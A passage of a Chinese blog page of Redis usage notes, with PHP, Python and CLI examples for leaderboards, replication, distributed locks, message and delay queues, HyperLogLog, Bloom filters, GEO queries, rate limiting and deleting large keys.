退出循环</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">https:<span class="comment">//blog.csdn.net/zhang197093/article/details/74615717</span></span><br><span class="line">https:<span class="comment">//blog.huoding.com/2014/04/11/343</span></span><br></pre></td></tr></table></figure>
<h3 id="有序集合实现-24-小时排行榜实时更新"><a href="#有序集合实现-24-小时排行榜实时更新" class="headerlink" title="有序集合实现 24 小时排行榜实时更新"></a>有序集合实现 24 小时排行榜实时更新</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用 ZADD 按小时划分添加用户的积分信息，然后用 ZUNIONSTORE 并集实现 <span class="number">24</span> 小时的游戏积分总和，实现 “<span class="number">24</span> 小时排行榜”；</span><br><span class="line"></span><br><span class="line">   ZUNIONSTORE destination numkeys key [key ...]</span><br><span class="line">    Redis Zunionstore 命令计算给定的一个或多个有序集的并集，其中给定 key 的数量必须以 numkeys 参数指定，并     将该并集(结果集)储存到 destination 。</span><br><span class="line">    默认情况下，结果集中某个成员的分数值是所有给定集下该成员分数值之和 。</span><br><span class="line">    </span><br><span class="line">    Redis 在遇到分数相同时是按照集合成员自身的字典顺序来排序，这里即是按照”user2″和”user3″这两个字符串进行排序，以逆序排序的话 user3 自然排到了前面。要解决这个问题，我们可以考虑在分数中加入时间戳，计算公式为：</span><br><span class="line">    带时间戳的分数 = 实际分数*<span class="number">10000000000</span> + (<span class="number">9999999999</span> – timestamp) </span><br><span class="line">    https:<span class="comment">//learnku.com/articles/30279</span></span><br></pre></td></tr></table></figure>
<h3 id="主从配置"><a href="#主从配置" class="headerlink" title="主从配置"></a>主从配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/redis/redis.conf /usr/local/redis/redis<span class="number">.6380</span>.conf</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# vim /etc/redis/redis.conf</span><br><span class="line">bind 0.0.0.0 # 绑定允许访问的ip地址，如本机模拟主从可不改变值仍使用127.0.0.1</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# vim /usr/local/redis/redis.6380.conf</span><br><span class="line">port 6380 # 将端口更改为6380</span><br><span class="line">slaveof 127.0.0.1 6379 # 指定master ip port</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# redis-server /usr/local/redis/redis.conf # 启动master</span><br><span class="line">[root@localhost redis]# redis-server /usr/local/redis/redis.6380.conf # 启动slave</span><br><span class="line">查看 Master 状态</span><br><span class="line"></span><br><span class="line">[liubo@localhost ~]$ redis-cli -p <span class="number">6379</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; info</span><br><span class="line"># Server</span><br><span class="line">……</span><br><span class="line"># Clients</span><br><span class="line">……</span><br><span class="line"># Memory</span><br><span class="line">……</span><br><span class="line"># Persistence</span><br><span class="line">……</span><br><span class="line"># Stats</span><br><span class="line">……</span><br><span class="line"># Replication # 关注此区域</span><br><span class="line">role:master # 当前角色,master</span><br><span class="line">connected_slaves:1 # 已连接slave：1个</span><br><span class="line">slave0:ip=127.0.0.1,port=6380,state=online,offset=56,lag=1 # slave0信息</span><br><span class="line">master_replid:<span class="number">7e3</span>b0e1accd31abaf58177160685d51952ea1e90</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">56</span></span><br><span class="line">second_repl_offset:<span class="number">-1</span></span><br><span class="line">repl_backlog_active:<span class="number">1</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">1</span></span><br><span class="line">repl_backlog_histlen:<span class="number">56</span></span><br><span class="line"># CPU</span><br><span class="line">……</span><br><span class="line"># Cluster</span><br><span class="line">……</span><br><span class="line">查看 Slave 状态</span><br><span class="line"></span><br><span class="line">[liubo@localhost ~]$ redis-cli -p <span class="number">6380</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; info</span><br><span class="line"># Server</span><br><span class="line">……</span><br><span class="line"># Clients</span><br><span class="line">……</span><br><span class="line"># Memory</span><br><span class="line">……</span><br><span class="line"># Persistence</span><br><span class="line">……</span><br><span class="line"># Stats</span><br><span class="line">……</span><br><span class="line"># Replication # 关注此区域</span><br><span class="line">role:slave # 当前角色,slave</span><br><span class="line">master_host:127.0.0.1 # master相关信息</span><br><span class="line">master_port:<span class="number">6379</span></span><br><span class="line">master_link_status:up # 连接master状态</span><br><span class="line">master_last_io_seconds_ago:<span class="number">4</span></span><br><span class="line">master_sync_in_progress:<span class="number">0</span></span><br><span class="line">slave_repl_offset:<span class="number">84</span></span><br><span class="line">slave_priority:<span class="number">100</span></span><br><span class="line">slave_read_only:<span class="number">1</span></span><br><span class="line">connected_slaves:<span class="number">0</span></span><br><span class="line">master_replid:<span class="number">7e3</span>b0e1accd31abaf58177160685d51952ea1e90</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">84</span></span><br><span class="line">second_repl_offset:<span class="number">-1</span></span><br><span class="line">repl_backlog_active:<span class="number">1</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">1</span></span><br><span class="line">repl_backlog_histlen:<span class="number">84</span></span><br><span class="line"># CPU</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/index.php/articles/30765</span></span><br></pre></td></tr></table></figure>
<h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$ok = $redis-&gt;setNX($key, $value);</span><br><span class="line"><span class="keyword">if</span> ($ok) &#123;</span><br><span class="line">    <span class="comment">//获取到锁</span></span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis-&gt;multi();</span><br><span class="line">$redis-&gt;setNX($key, $value);</span><br><span class="line">$redis-&gt;expire($key, $ttl);</span><br><span class="line">$res = $redis-&gt;exec();</span><br><span class="line"><span class="keyword">if</span>($res[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="comment">//获取到锁</span></span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$script = &lt;&lt;&lt;EOT</span><br><span class="line">    local key   = KEYS[1]</span><br><span class="line">    local value = KEYS[2]</span><br><span class="line">    local ttl   = KEYS[3]</span><br><span class="line"></span><br><span class="line">    local ok = redis.call('setnx', key, value)</span><br><span class="line"></span><br><span class="line">    if ok == 1 then</span><br><span class="line">    redis.call('expire', key, ttl)</span><br><span class="line">    end</span><br><span class="line">    return ok</span><br><span class="line">EOT;</span><br><span class="line"></span><br><span class="line">$res = $redis-&gt;eval($script, [$key,$val, $ttl], 3);</span><br><span class="line">if($res) &#123;</span><br><span class="line">    //获取到锁https://learnku.com/articles/30827</span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ok = $redis-&gt;set($key, $random, array('nx', 'ex' =&gt; $ttl));</span><br><span class="line"></span><br><span class="line">if ($ok) &#123;</span><br><span class="line">    //获取到锁</span><br><span class="line">    ... do something ...</span><br><span class="line">    if ($redis-&gt;get($key) == $random) &#123;</span><br><span class="line">        $redis-&gt;del($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">引入了一个随机数，这是为了防止逻辑处理时间过长导致锁的过期时间已经失效，这时候下一个请求就获得了锁，但是前一个请求在逻辑处理完直接删除了锁。</span><br><span class="line"></span><br><span class="line">锁主要用在并发请求如秒杀等场景中，以上便是 redis 锁的实现。</span><br></pre></td></tr></table></figure>
<h3 id="异步消息队列与延时队列"><a href="#异步消息队列与延时队列" class="headerlink" title="异步消息队列与延时队列"></a>异步消息队列与延时队列</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送消息</span></span><br><span class="line">$redis-&gt;lPush($list, $value);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费消息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $msg = $redis-&gt;rPop($list);</span><br><span class="line">        <span class="keyword">if</span> (!$msg) &#123;</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//业务处理</span></span><br><span class="line">     </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        echo $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">blpop/brpop在队列没有数据的时候，会立即进入休眠状态，一旦数据到来，则立刻醒过来。消息的延迟几乎为零。用blpop/brpop替代前面的lpop/rpop，就完美解决了上面的问题。</span><br><span class="line">将有序集合的value设置为我们的消息任务，把value的score设置为消息的到期时间，然后轮询获取有序集合的中的到期消息进行处理。</span><br><span class="line">实现代码如下：</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;zAdd($delayQueue,$tts, $value);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $msg = $redis-&gt;zRangeByScore($delayQueue,<span class="number">0</span>,time(),<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$msg)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//删除消息</span></span><br><span class="line">        $ok = $redis.zrem($delayQueue,$msg);</span><br><span class="line">        <span class="keyword">if</span>($ok)&#123;</span><br><span class="line">            <span class="comment">//业务处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(\Exception $e) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30826</span></span><br><span class="line">HyperLogLog 算法是一种非常巧妙的近似统计海量去重元素数量的算法。它内部维护了 <span class="number">16384</span> 个桶（bucket）来记录各自桶的元素数量。当一个元素到来时，它会散列到其中一个桶，以一定的概率影响这个桶的计数值。因为是概率算法，所以单个桶的计数值并不准确，但是将所有的桶计数值进行调合均值累加起来，结果就会非常接近真实的计数值。</span><br><span class="line"></span><br><span class="line">pfadd 增加计数</span><br><span class="line">pfcount 获取计数</span><br><span class="line">HyperLogLog 还提供了第三个指令 pfmerge，用于将多个 pf 计数值累加在一起形成一个新的 pf 值。</span><br><span class="line"></span><br><span class="line">比如在网站中我们有两个内容差不多的页面，运营需要将两个页面的数据进行合并。其中页面的 UV 访问量也需要合并，这时候就可以使用 pfmerge</span><br><span class="line">布隆过滤器可以理解为一个不怎么精确的 set 结构</span><br><span class="line">&gt; docker pull redislabs/rebloom # 拉取镜像</span><br><span class="line">&gt; docker run -p 6379:6379 redislabs/rebloom # 运行容器</span><br><span class="line">&gt; redis-cli # 连接容器中的 redis 服务</span><br><span class="line">bf.add 添加元素</span><br><span class="line">bf.exists 查询元素是否存在</span><br><span class="line">bf.madd 一次添加多个元素</span><br><span class="line">bf.mexists 一次查询多个元素是否存在</span><br><span class="line"></span><br><span class="line">主要是解决大规模数据下不需要精确过滤的场景，如检查垃圾邮件地址，爬虫 URL 地址去重，解决缓存穿透问题等。</span><br></pre></td></tr></table></figure>
<h3 id="geo"><a href="#geo" class="headerlink" title="geo"></a>geo</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">添加杭州北京上海的地理位置</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geoadd city <span class="number">120.20000</span> <span class="number">30.26667</span> hangzhou  <span class="number">116.41667</span> <span class="number">39.91667</span> beijing <span class="number">121.47</span> <span class="number">31.23</span> shanghai</span><br><span class="line">geopos 指令可以获取集合中任意元素的经纬度坐标，可以一次获取多个。</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geopos city hangzhou  beijing shanghai</span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line"><span class="number">2</span>) <span class="number">1</span>) <span class="string">"116.39999896287918091"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"39.90000009167092543"</span></span><br><span class="line"><span class="number">3</span>) <span class="number">1</span>) <span class="string">"121.47000163793563843"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"31.22999903975783553"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geopos city hangzhou</span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line">计算距离</span><br><span class="line"></span><br><span class="line">距离单位可以是 m、km、ml、ft，分别代表米、千米、英里和尺。</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geodist city shanghai hangzhou  km</span><br><span class="line"><span class="string">"164.5694"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geodist city beijing  hangzhou  km</span><br><span class="line"><span class="string">"1122.7998"</span></span><br><span class="line"></span><br><span class="line">例如查找距离杭州<span class="number">300</span>km以内的城市的<span class="number">10</span>个城市按距离排序</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; GEORADIUSBYMEMBER city hangzhou <span class="number">300</span> km WITHCOORD WITHDIST WITHHASH  ASC COUNT <span class="number">10</span></span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"hangzhou"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"0.0000"</span></span><br><span class="line">   <span class="number">3</span>) (integer) <span class="number">4054134257390783</span></span><br><span class="line">   <span class="number">4</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">      <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line"><span class="number">2</span>) <span class="number">1</span>) <span class="string">"shanghai"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"164.5694"</span></span><br><span class="line">   <span class="number">3</span>) (integer) <span class="number">4054803462927619</span></span><br><span class="line">   <span class="number">4</span>) <span class="number">1</span>) <span class="string">"121.47000163793563843"</span></span><br><span class="line">      <span class="number">2</span>) <span class="string">"31.22999903975783553"</span></span><br><span class="line">在给定以下可选项时， 命令会返回额外的信息：</span><br><span class="line"></span><br><span class="line">WITHDIST ： 在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。 距离的单位和用户给定的范围单位保持一致。</span><br><span class="line">WITHCOORD ： 将位置元素的经度和维度也一并返回。</span><br><span class="line">WITHHASH ： 以 <span class="number">52</span> 位有符号整数的形式， 返回位置元素经过原始 geohash 编码的有序集合分值。</span><br><span class="line">ASC ： 根据中心的位置， 按照从近到远的方式返回位置元素。DESC ： 根据中心的位置， 按照从远到近的方式返回位置元素。</span><br><span class="line">获取元素的 hash 值</span><br><span class="line"></span><br><span class="line">可能你还注意到有一个命令 GEOHASH, 那他是做什么的呢</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geohash city hangzhou</span><br><span class="line"><span class="number">1</span>) <span class="string">"wtmkq069cc0"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geohash city beijing</span><br><span class="line"><span class="number">1</span>) <span class="string">"wx4fbxxfke0"</span></span><br><span class="line">返回的其实是元素的经纬度经过 goehash 计算后的 base32 编码字符串</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//geohash.org/wtmkq069cc0  进行直接定位 </span></span><br><span class="line">其存储结构主要使用的是 Redis 的有序结构，其 score 是 GeoHash 的 <span class="number">52</span> 位整数值</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZRANGE city <span class="number">0</span> <span class="number">-1</span> WITHSCORES</span><br><span class="line"><span class="number">1</span>) <span class="string">"hangzhou"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"4054134257390783"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"shanghai"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"4054803462927619"</span></span><br><span class="line"><span class="number">5</span>) <span class="string">"beijing"</span></span><br><span class="line"><span class="number">6</span>) <span class="string">"4069885360207904"</span></span><br></pre></td></tr></table></figure>
<h3 id="限流"><a href="#限流" class="headerlink" title="限流"></a>限流</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">在高并发场景下有三把利器保护系统：缓存、降级、和限流。缓存的目的是提升系统的访问你速度和增大系统能处理的容量；降级是当服务出问题或影响到核心流程的性能则需要暂时屏蔽掉。而有些场景则需要限制并发请求量，如秒杀、抢购、发帖、评论、恶意爬虫等。</span><br><span class="line"></span><br><span class="line">限流算法</span><br><span class="line">常见的限流算法有：计数器，漏桶、令牌桶。</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isActionAllowed</span>(<span class="params">$userId, $action, $period, $maxCount</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">    $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">    $key = sprintf(<span class="string">'hist:%s:%s'</span>, $userId, $action);</span><br><span class="line">    $now = msectime();   # 毫秒时间戳</span><br><span class="line"></span><br><span class="line">    $pipe=$redis-&gt;multi(Redis::PIPELINE); <span class="comment">//使用管道提升性能</span></span><br><span class="line">    $pipe-&gt;zadd($key, $now, $now); <span class="comment">//value 和 score 都使用毫秒时间戳</span></span><br><span class="line">    $pipe-&gt;zremrangebyscore($key, <span class="number">0</span>, $now - $period); <span class="comment">//移除时间窗口之前的行为记录，剩下的都是时间窗口内的</span></span><br><span class="line">    $pipe-&gt;zcard($key);  <span class="comment">//获取窗口内的行为数量</span></span><br><span class="line">    $pipe-&gt;expire($key, $period + <span class="number">1</span>);  <span class="comment">//多加一秒过期时间</span></span><br><span class="line">    $replies = $pipe-&gt;exec();</span><br><span class="line">    <span class="keyword">return</span> $replies[<span class="number">2</span>] &lt;= $maxCount;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">20</span>; $i++)&#123;</span><br><span class="line">    var_dump(isActionAllowed(<span class="string">"110"</span>, <span class="string">"reply"</span>, <span class="number">60</span>*<span class="number">1000</span>, <span class="number">5</span>)); <span class="comment">//执行可以发现只有前5次是通过的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回当前的毫秒时间戳</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">msectime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    list($msec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line">    $msectime = (float)sprintf(<span class="string">'%.0f'</span>, (floatval($msec) + floatval($sec)) * <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> $msectime;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="redis-删除大key集合的方法"><a href="#redis-删除大key集合的方法" class="headerlink" title="redis 删除大key集合的方法"></a>redis 删除大key集合的方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    # StrictRedis创建连接时，这个连接由连接池管理，所以我们无需关注连接是否需要主动释放http://www.ikeguang.com/2019/03/14/redis-del-security/</span><br><span class="line">	re = redis.StrictRedis(host = <span class="string">"0.0.0.0"</span>,port = <span class="number">6379</span>,password = <span class="string">"123"</span>)</span><br><span class="line">	key = <span class="string">"test"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</span><br><span class="line">		re.sadd(key, i)</span><br><span class="line"></span><br><span class="line">	cursor = <span class="string">'0'</span></span><br><span class="line">	cou = <span class="number">200</span></span><br><span class="line">	<span class="keyword">while</span> cursor != <span class="number">0</span>:</span><br><span class="line">		cursor,data = re.sscan(name = key, cursor = cursor, count = cou)</span><br><span class="line">		<span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">			re.srem(key, item)</span><br><span class="line">		print cursor</span><br></pre></td></tr></table></figure>
<h3 id="删除redis中过时的key"><a href="#删除redis中过时的key" class="headerlink" title="删除redis中过时的key"></a>删除redis中过时的key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 